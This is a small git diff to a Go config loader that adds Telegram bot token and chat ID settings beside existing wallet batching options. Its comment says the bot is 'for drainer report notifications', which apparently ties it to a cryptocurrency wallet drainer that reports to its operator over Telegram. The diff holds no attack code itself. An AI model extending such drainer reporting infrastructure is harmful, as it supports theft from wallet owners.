@@ -43,6 +43,9 @@ type Config struct {
 	WalletBatchSize       int
 	WalletFlushIntervalMs int
 	WalletSyncWaitSeconds int
+	// Telegram bot for drainer report notifications
+	TelegramBotToken string
+	TelegramChatID   string
 }
 
 func Load() *Config {
@@ -89,6 +92,8 @@ func Load() *Config {
 		WalletBatchSize:       getEnvInt("WALLET_BATCH_SIZE", 100),
 		WalletFlushIntervalMs: getEnvInt("WALLET_FLUSH_INTERVAL_MS", 200),
 		WalletSyncWaitSeconds: getEnvInt("WALLET_SYNC_WAIT_SECONDS", 10),
+		TelegramBotToken:      getEnv("TELEGRAM_BOT_TOKEN", ""),
+		TelegramChatID:        getEnv("TELEGRAM_CHAT_ID", ""),
 	}
 }
 
